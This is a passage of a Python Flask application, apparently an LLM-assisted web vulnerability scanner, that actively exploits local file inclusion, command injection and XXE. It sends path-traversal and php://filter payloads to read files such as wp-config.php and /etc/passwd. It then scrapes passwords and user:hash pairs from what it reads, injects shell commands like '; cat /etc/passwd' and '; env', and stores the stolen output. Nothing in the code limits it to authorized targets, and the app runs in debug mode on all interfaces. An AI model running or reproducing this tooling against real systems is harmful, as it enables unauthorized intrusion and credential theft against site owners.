                '../../../var/www/html/wp-config.php',
                '../../../var/www/html/database.php',
                '../../../usr/local/apache2/conf/httpd.conf',
                
                # PHP wrappers for more advanced exploitation
                'php://filter/read=convert.base64-encode/resource=../../../etc/passwd',
                'php://filter/read=convert.base64-encode/resource=index.php',
                'php://filter/read=convert.base64-encode/resource=config.php'
            ]
            
            extracted_files = {}
            
            for file_path in sensitive_files:
                try:
                    if '?' in base_url:
                        test_url = f"{base_url}&{param}={urllib.parse.quote(file_path)}"
                    else:
                        test_url = f"{base_url}?{param}={urllib.parse.quote(file_path)}"
                    
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check if file content was retrieved
                    file_indicators = {
                        'passwd': ['root:x:', 'daemon:x:', 'nobody:x:'],
                        'shadow': ['root:$', '$1$', '$6$'],
                        'hosts': ['127.0.0.1', 'localhost'],
                        'config': ['<?php', 'database', 'password', 'DB_PASSWORD'],
                        'log': ['GET /', 'POST /', 'Mozilla/', 'HTTP/1.'],
                        'ssh_key': ['-----BEGIN', 'PRIVATE KEY', 'ssh-rsa'],
                        'history': ['cd ', 'ls ', 'cat ', 'mysql'],
                        'apache': ['ServerRoot', 'DocumentRoot', 'LoadModule'],
                        'nginx': ['server {', 'listen ', 'root '],
                        'win_ini': ['[fonts]', '[extensions]', 'Windows'],
                        'web_config': ['<configuration>', '<appSettings>', '<connectionStrings>']
                    }
                    
                    for file_type, indicators in file_indicators.items():
                        if any(indicator in response.text for indicator in indicators):
                            content = response.text[:500]  # First 500 chars
                            
                            # For base64 encoded content, try to decode
                            if 'php://filter' in file_path and 'base64' in file_path:
                                import base64
                                try:
                                    # Extract base64 content
                                    b64_match = re.search(r'([A-Za-z0-9+/=]{20,})', content)
                                    if b64_match:
                                        decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
                                        content = decoded[:500]
                                except:
                                    pass
                            
                            extracted_files[file_path] = {
                                'type': file_type,
                                'content': content,
                                'size': len(response.text)
                            }
                            print(f"[SUCCESS] Extracted {file_path} ({len(response.text)} bytes)")
                            break
                    
                    time.sleep(0.5)  # Small delay between requests
                    
                except Exception as e:
                    continue  # Try next file
            
            data_extracted = len(extracted_files) > 0
            
            if data_extracted:
                print(f"[CRITICAL] Successfully extracted {len(extracted_files)} files")
                
                # Try to find credentials in extracted files
                self._extract_credentials_from_files(extracted_files)
            
            return extracted_files, data_extracted
            
        except Exception as e:
            print(f"[ERROR] LFI exploitation failed: {e}")
            return None, False
    
    def _extract_credentials_from_files(self, extracted_files):
        """Extract credentials from LFI extracted files"""
        credentials_found = []
        
        for file_path, file_data in extracted_files.items():
            content = file_data['content']
            
            # Look for common credential patterns
            credential_patterns = [
                r'password["\s]*[:=]["\s]*([^"\s\n]+)',
                r'DB_PASSWORD["\s]*[:=]["\s]*([^"\s\n]+)',
                r'mysql_password["\s]*[:=]["\s]*([^"\s\n]+)',
                r'admin["\s]*[:=]["\s]*([^"\s\n]+)',
                r'root:([^:]+):',  # Shadow file format
                r'([a-zA-Z0-9_]+):([a-zA-Z0-9$./]+):',  # General user:pass format
            ]
            
            for pattern in credential_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    for match in matches[:3]:  # Limit to 3 matches per pattern
                        if isinstance(match, tuple):
                            credentials_found.append(f"{match[0]}:{match[1]}")
                        else:
                            credentials_found.append(match)
        
        if credentials_found:
            print(f"[CRITICAL] Found potential credentials: {credentials_found}")
            # Store credentials in extracted_files for reporting
            extracted_files['_credentials'] = credentials_found
    
    def test_command_injection(self, url, params=None):
        """Test for Command Injection vulnerabilities"""
        payloads = self.generate_llm_payloads('command_injection', url)
        results = []
        
        for payload in payloads:
            try:
                # Test different parameter names
                param_names = ['cmd', 'command', 'exec', 'system', 'ping', 'host', 'ip']
                
                for param in param_names:
                    if '?' in url:
                        test_url = f"{url}&{param}={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    
                    response = self.session.get(test_url, timeout=15)
                    
                    # Check for command execution indicators
                    cmd_indicators = [
                        'uid=', 'gid=', 'groups=', 'root:', 'bin/sh', 'bin/bash',
                        'Windows IP Configuration', 'Volume in drive', 'Directory of',
                        'total ', 'drwx', '-rw-', 'Permission denied', 'command not found'
                    ]
                    
                    is_vulnerable = any(indicator in response.text for indicator in cmd_indicators)
                    
                    # Check response time for blind command injection
                    if 'sleep' in payload.lower() or 'ping' in payload.lower():
                        # If response took longer than expected, might be vulnerable
                        if response.elapsed.total_seconds() > 3:
                            is_vulnerable = True
                    
                    # If vulnerable, try to extract system information
                    extracted_data = None
                    data_extracted = False
                    
                    if is_vulnerable:
                        print(f"[VULN FOUND] Command Injection detected at {test_url}")
                        extracted_data, data_extracted = self._exploit_command_injection(url, param)
                    
                    confidence = 0.95 if data_extracted else (0.8 if is_vulnerable else 0.1)
                    
                    result = {
                        'url': test_url,
                        'vulnerability_type': 'Command Injection',
                        'payload': payload,
                        'response_code': response.status_code,
                        'response_content': response.text[:1000],
                        'is_vulnerable': is_vulnerable,
                        'confidence_score': confidence,
                        'timestamp': datetime.now().isoformat(),
                        'data_extracted': data_extracted,
                        'extracted_data': extracted_data,
                        'severity': 'CRITICAL' if data_extracted else ('HIGH' if is_vulnerable else 'LOW')
                    }
                    
                    results.append(result)
                    self._save_result(result)
                    
                    if is_vulnerable:
                        break
                    
                    time.sleep(random.uniform(0.5, 1.0))
                
            except Exception as e:
                print(f"Error testing Command Injection on {url}: {e}")
                
        return results
    
    def _exploit_command_injection(self, base_url, param):
        """Attempt to extract system information through command injection"""
        try:
            print(f"[EXPLOIT] Attempting command injection exploitation")
            
            # System information extraction commands
            exploitation_commands = [
                # Basic system info
                '; whoami',
                '; id',
                '; uname -a',
                '; cat /etc/passwd | head -5',
                '; ls -la /',
                '; pwd',
                
                # Windows commands
                '& whoami',
                '& dir C:\\',
                '& type C:\\Windows\\win.ini',
                
                # Network information
                '; ifconfig',
                '; netstat -an | head -10',
                '; ps aux | head -10',
                
                # Environment information
                '; env | head -10',
                '; cat /proc/version',
                '; cat /etc/issue',
                
                # File system exploration
                '; find / -name "*.conf" 2>/dev/null | head -5',
                '; find / -name "*.log" 2>/dev/null | head -5'
            ]
            
            extracted_info = {}
            
            for command in exploitation_commands:
                try:
                    if '?' in base_url:
                        test_url = f"{base_url}&{param}={urllib.parse.quote(command)}"
                    else:
                        test_url = f"{base_url}?{param}={urllib.parse.quote(command)}"
                    
                    response = self.session.get(test_url, timeout=15)
                    
                    # Check for command execution indicators
                    execution_indicators = {
                        'whoami': ['root', 'www-data', 'apache', 'nginx', 'user'],
                        'id': ['uid=', 'gid=', 'groups='],
                        'uname': ['Linux', 'GNU', 'Ubuntu', 'CentOS', 'Darwin'],
                        'passwd': ['root:x:', 'daemon:x:', 'bin:x:'],
                        'ls': ['drwx', '-rw-', 'total '],
                        'dir': ['Directory of', 'Volume in drive'],
                        'ifconfig': ['inet ', 'ether ', 'RX packets'],
                        'netstat': ['LISTEN', 'ESTABLISHED', 'tcp'],
                        'ps': ['PID', 'USER', 'COMMAND'],
                        'env': ['PATH=', 'HOME=', 'USER='],
                        'proc': ['version', 'gcc version'],
                        'issue': ['Ubuntu', 'CentOS', 'Debian'],
                        'find': ['.conf', '.log', '/etc/', '/var/']
                    }
                    
                    for cmd_type, indicators in execution_indicators.items():
                        if cmd_type in command.lower():
                            if any(indicator in response.text for indicator in indicators):
                                # Extract the relevant output
                                output_lines = response.text.split('\n')
                                relevant_output = []
                                
                                for line in output_lines:
                                    if any(indicator in line for indicator in indicators):
                                        relevant_output.append(line.strip())
                                        if len(relevant_output) >= 5:  # Limit output
                                            break
                                
                                if relevant_output:
                                    extracted_info[cmd_type] = relevant_output
                                    print(f"[SUCCESS] Command execution confirmed: {cmd_type}")
                    
                    time.sleep(0.8)  # Delay between commands
                    
                except Exception as e:
                    continue  # Try next command
            
            # Try to extract sensitive information from the responses
            if extracted_info:
                self._extract_system_info(extracted_info)
            
            data_extracted = len(extracted_info) > 0
            
            if data_extracted:
                print(f"[CRITICAL] Command injection exploitation successful: {list(extracted_info.keys())}")
            
            return extracted_info, data_extracted
            
        except Exception as e:
            print(f"[ERROR] Command injection exploitation failed: {e}")
            return None, False
    
    def _extract_system_info(self, extracted_info):
        """Extract additional system information from command outputs"""
        try:
            # Extract usernames from whoami/id output
            if 'whoami' in extracted_info:
                for line in extracted_info['whoami']:
                    if line and not line.startswith('uid='):
                        extracted_info['current_user'] = line
            
            # Extract system type from uname
            if 'uname' in extracted_info:
                for line in extracted_info['uname']:
                    if 'Linux' in line:
                        extracted_info['system_type'] = 'Linux'
                    elif 'Darwin' in line:
                        extracted_info['system_type'] = 'macOS'
                    elif 'Windows' in line:
                        extracted_info['system_type'] = 'Windows'
            
            # Extract running processes
            if 'ps' in extracted_info:
                processes = []
                for line in extracted_info['ps']:
                    if 'apache' in line.lower() or 'nginx' in line.lower() or 'mysql' in line.lower():
                        processes.append(line)
                if processes:
                    extracted_info['important_processes'] = processes
            
            # Extract network information
            if 'ifconfig' in extracted_info:
                ip_addresses = []
                for line in extracted_info['ifconfig']:
                    import re
                    ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', line)
                    if ip_match and not ip_match.group(1).startswith('127.'):
                        ip_addresses.append(ip_match.group(1))
                if ip_addresses:
                    extracted_info['ip_addresses'] = ip_addresses
            
        except Exception as e:
            print(f"[ERROR] System info extraction failed: {e}")
    
    def test_xxe(self, url, params=None):
        """Test for XXE (XML External Entity) vulnerabilities"""
        payloads = self.generate_llm_payloads('xxe', url)
        results = []
        
        for payload in payloads:
            try:
                # Test POST request with XML payload
                headers = {
                    'Content-Type': 'application/xml',
                    'Accept': 'application/xml, text/xml'
                }
                
                response = self.session.post(url, data=payload, headers=headers, timeout=10)
                
                # Check for XXE indicators
                xxe_indicators = [
                    'root:x:', 'daemon:x:', '/etc/passwd', 'Windows Registry Editor',
                    '<?xml', 'ENTITY', 'DOCTYPE', 'file:///', 'http://'
                ]
                
                is_vulnerable = any(indicator in response.text for indicator in xxe_indicators)
                
                # Also check for error messages that might indicate XXE processing
                error_indicators = [
                    'XML parsing error', 'External entity', 'DTD processing',
                    'libxml', 'XMLSyntaxError', 'SAXParseException'
                ]
                
                has_xml_processing = any(error in response.text for error in error_indicators)
                if has_xml_processing and not is_vulnerable:
                    confidence = 0.3  # Might be vulnerable but not confirmed
                else:
                    confidence = 0.9 if is_vulnerable else 0.1
                
                result = {
                    'url': url,
                    'vulnerability_type': 'XXE',
                    'payload': payload,
                    'response_code': response.status_code,
                    'response_content': response.text[:1000],
                    'is_vulnerable': is_vulnerable,
                    'confidence_score': confidence,
                    'timestamp': datetime.now().isoformat()
                }
                
                results.append(result)
                self._save_result(result)
                
                time.sleep(random.uniform(0.5, 1.0))
                
            except Exception as e:
                print(f"Error testing XXE on {url}: {e}")
                
        return results
    
    def _save_result(self, result):
        """Save scan result to database"""
        conn = sqlite3.connect('scanner_results.db')
        c = conn.cursor()
        
        # Convert extracted_data to JSON string if it exists
        extracted_data_json = None
        if result.get('extracted_data'):
            import json
            try:
                extracted_data_json = json.dumps(result['extracted_data'])
            except:
                extracted_data_json = str(result['extracted_data'])
        
        c.execute('''INSERT INTO scan_results 
                     (timestamp, target_url, vulnerability_type, payload, 
                      response_code, response_content, is_vulnerable, confidence_score,
                      data_extracted, extracted_data, severity)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (result['timestamp'], result['url'], result['vulnerability_type'],
                   result['payload'], result['response_code'], result['response_content'],
                   result['is_vulnerable'], result['confidence_score'],
                   result.get('data_extracted', False), extracted_data_json,
                   result.get('severity', 'LOW')))
        conn.commit()
        conn.close()
    
    def run_comprehensive_scan(self, target_url, scan_types=None):
        """Run comprehensive vulnerability scan"""
        if scan_types is None:
            scan_types = ['sql_injection', 'xss', 'lfi', 'command_injection', 'xxe']
        
        # Discover URLs first
        print("Discovering internal URLs...")
        urls = self.discover_urls(target_url)
        urls.append(target_url)  # Include the main URL
        
        all_results = []
        
        # Test each URL for each vulnerability type
        for url in urls:
            for scan_type in scan_types:
                print(f"Testing {scan_type} on {url}")
                
                if scan_type == 'sql_injection':
                    results = self.test_sql_injection(url)
                elif scan_type == 'xss':
                    results = self.test_xss(url)
                elif scan_type == 'lfi':
                    results = self.test_lfi(url)
                elif scan_type == 'command_injection':
                    results = self.test_command_injection(url)
                elif scan_type == 'xxe':
                    results = self.test_xxe(url)
                
                all_results.extend(results)
        
        return all_results

def clear_previous_results(target_url):
    """Clear previous scan results for the target URL"""
    try:
        conn = sqlite3.connect('scanner_results.db')
        c = conn.cursor()
        
        # Parse the target URL to get the base domain
        from urllib.parse import urlparse
        parsed_target = urlparse(target_url)
        target_domain = f"{parsed_target.scheme}://{parsed_target.netloc}"
        
        # Delete all results that match the target domain
        c.execute("DELETE FROM scan_results WHERE target_url LIKE ?", (f"{target_domain}%",))
        deleted_count = c.rowcount
        
        conn.commit()
        conn.close()
        
        print(f"[INFO] Cleared {deleted_count} previous results for {target_domain}")
        
    except Exception as e:
        print(f"[ERROR] Failed to clear previous results: {e}")

# Global scanner instance
scanner = VulnerabilityScanner()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/configure', methods=['POST'])
def configure():
    data = request.json
    target_url = data.get('target_url')
    api_key = data.get('api_key')
    ollama_model = data.get('ollama_model')
    use_ollama = data.get('use_ollama', False)
    
    # Clear previous session data when configuring new target
    if session.get('target_url') != target_url:
        print(f"[INFO] New target detected: {target_url}")
        # Clear previous scan results for this session
        session['scan_session_id'] = f"scan_{int(time.time())}"
        scanner.discovered_urls = set()
        scanner.vulnerabilities_found = []
        
        # Clear previous results from database for this target
        clear_previous_results(target_url)
    
    session['target_url'] = target_url
    scanner.configure_llm(api_key, ollama_model, use_ollama)
    
    return jsonify({'status': 'configured', 'session_id': session.get('scan_session_id')})

@app.route('/discover_urls', methods=['POST'])
def discover_urls():
    target_url = session.get('target_url')
    if not target_url:
        return jsonify({'error': 'No target URL configured'})
    
    urls = scanner.discover_urls(target_url)
    return jsonify({'urls': urls})

@app.route('/scan', methods=['POST'])
def scan():
    data = request.json
    target_url = session.get('target_url')
    scan_types = data.get('scan_types', ['sql_injection', 'xss', 'lfi'])
    
    if not target_url:
        return jsonify({'error': 'No target URL configured'})
    
    # Run scan in background thread
    def run_scan():
        results = scanner.run_comprehensive_scan(target_url, scan_types)
        session['last_scan_results'] = results
    
    thread = threading.Thread(target=run_scan)
    thread.start()
    
    return jsonify({'status': 'scan_started'})

@app.route('/results')
def get_results():
    target_url = session.get('target_url')
    if not target_url:
        return jsonify({'results': []})
    
    # Parse the target URL to get the base domain
    from urllib.parse import urlparse
    parsed_target = urlparse(target_url)
    target_domain = f"{parsed_target.scheme}://{parsed_target.netloc}"
    
    conn = sqlite3.connect('scanner_results.db')
    c = conn.cursor()
    
    # Only get results for the current target domain
    c.execute('''SELECT * FROM scan_results 
                 WHERE target_url LIKE ? 
                 ORDER BY timestamp DESC LIMIT 100''', (f"{target_domain}%",))
    results = c.fetchall()
    conn.close()
    
    formatted_results = []
    for result in results:
        # Handle both old and new database schema
        try:
            data_extracted = result[9] if len(result) > 9 else False
            extracted_data = result[10] if len(result) > 10 else None
            severity = result[11] if len(result) > 11 else 'LOW'
        except IndexError:
            data_extracted = False
            extracted_data = None
            severity = 'LOW'
        
        # Parse extracted_data if it's JSON
        if extracted_data:
            import json
            try:
                extracted_data = json.loads(extracted_data)
            except:
                pass  # Keep as string if not valid JSON
        
        formatted_results.append({
            'id': result[0],
            'timestamp': result[1],
            'target_url': result[2],
            'vulnerability_type': result[3],
            'payload': result[4],
            'response_code': result[5],
            'response_content': result[6][:200] + '...' if len(result[6]) > 200 else result[6],
            'is_vulnerable': result[7],
            'confidence_score': result[8],
            'data_extracted': data_extracted,
            'extracted_data': extracted_data,
            'severity': severity
        })
    
    return jsonify({'results': formatted_results, 'target_domain': target_domain})

@app.route('/status')
def get_status():
    return jsonify({
        'discovered_urls_count': len(scanner.discovered_urls),
        'vulnerabilities_found': len([r for r in scanner.vulnerabilities_found if r.get('is_vulnerable')]),
        'llm_configured': scanner.llm_model is not None or scanner.use_ollama
    })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)